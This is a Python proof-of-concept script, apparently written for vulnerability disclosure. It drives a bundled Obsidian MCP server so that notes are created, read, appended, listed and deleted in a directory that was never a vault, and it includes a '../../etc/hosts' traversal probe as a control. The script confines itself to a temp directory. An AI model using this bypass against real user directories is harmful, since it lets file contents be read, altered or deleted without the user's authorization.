#!/usr/bin/env python3
"""Conclusive reproducible PoC: obsidian_mcp_server vault_path authorization bypass.

The bundled Obsidian MCP server never validates that vault_path is an actual
Obsidian vault (or a user-approved "connected folder"). Any user-writable
directory is accepted, and the full note toolset (read/create/append/list/delete)
then operates on *.md files there — outside any vault the user connected.

This script performs one clean end-to-end run against a researcher-owned
temp directory: it creates, reads, appends, lists, and deletes a note in a
directory that was NEVER initialized as a vault.

Run only on your own machine.
"""
import json
import os
import shutil
import subprocess
import sys
import time

BIN = "/Applications/Gemini.app/Contents/Helpers/obsidian_mcp_server"
PROOF_DIR = "/tmp/not_a_vault_proof"          # never initialized as a vault
NOTE = "proof.md"

shutil.rmtree(PROOF_DIR, ignore_errors=True)
os.makedirs(PROOF_DIR, exist_ok=True)
assert not os.path.exists(f"{PROOF_DIR}/.obsidian"), "unexpected real vault marker"

proc = subprocess.Popen([BIN], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE, text=True)
_id = [0]

def send(method, params=None, notify=False):
    obj = {"jsonrpc": "2.0", "method": method}
    if not notify:
        _id[0] += 1
        obj["id"] = _id[0]
        if params: obj["params"] = params
    proc.stdin.write(json.dumps(obj) + '\n')
    proc.stdin.flush()

def read_msg(timeout=30):
    start = time.time()
    while time.time() - start < timeout:
        line = proc.stdout.readline()
        if line.strip():
            return json.loads(line)
    return None

def call(name, args):
    send("tools/call", {"name": name, "arguments": args})
    return read_msg()

def text_of(resp):
    try:
        return " ".join(p.get("text", "") for p in resp["result"]["content"])
    except Exception:
        return json.dumps(resp)

send("initialize", {"protocolVersion": "2025-06-18", "capabilities": {},
                     "clientInfo": {"name": "poc", "version": "1.0"}})
r = read_msg()
assert r and "result" in r, "MCP init failed"
send("notifications/initialized", notify=True)
print(f"target: {BIN}\nserver : {r['result']['serverInfo']}\n")

ok = True

# 1) CREATE a note in a directory that is NOT a vault
resp = call("obsidian_create_note", {"vault_path": PROOF_DIR, "note_path": NOTE,
                                      "content": "# created outside any vault\n"})
created = os.path.exists(f"{PROOF_DIR}/{NOTE}")
print(f"[1] create_note in non-vault dir : {text_of(resp).strip()[:60]} | file exists: {created}")
ok &= created

# 2) READ it back
resp = call("obsidian_read_note", {"vault_path": PROOF_DIR, "note_path": NOTE})
content = open(f"{PROOF_DIR}/{NOTE}").read()
read_ok = text_of(resp).strip() == content.strip()
print(f"[2] read_note from non-vault dir  : matches file content: {read_ok}")
ok &= read_ok

# 3) APPEND to it
resp = call("obsidian_append_note", {"vault_path": PROOF_DIR, "note_path": NOTE,
                                      "content": "APPEND_MARKER"})
appended = "APPEND_MARKER" in open(f"{PROOF_DIR}/{NOTE}").read()
print(f"[3] append_note in non-vault dir  : marker in file: {appended} | {text_of(resp).strip()[:50]}")
ok &= appended

# 4) LIST notes
resp = call("obsidian_list_notes", {"vault_path": PROOF_DIR})
listed = NOTE in text_of(resp)
print(f"[4] list_notes in non-vault dir   : note listed: {listed}")
ok &= listed

# 5) DELETE it
resp = call("obsidian_delete_note", {"vault_path": PROOF_DIR, "note_path": NOTE,
                                      "permanent": True})
deleted = not os.path.exists(f"{PROOF_DIR}/{NOTE}")
print(f"[5] delete_note in non-vault dir  : {text_of(resp).strip()[:50]} | file removed: {deleted}")
ok &= deleted

# CONTROL: note_path traversal IS blocked (defense exists for relative paths)
resp = call("obsidian_read_note", {"vault_path": PROOF_DIR,
                                    "note_path": "../../etc/hosts"})
trav_blocked = "escape vault" in text_of(resp)
print(f"[C] control: ../ traversal blocked : {trav_blocked}")

print("\n" + ("*** VAULT_PATH BYPASS CONFIRMED — all 5 tools operated outside any vault ***"
              if ok else "PARTIAL — see steps above"))
proc.kill()
sys.exit(0 if ok else 1)
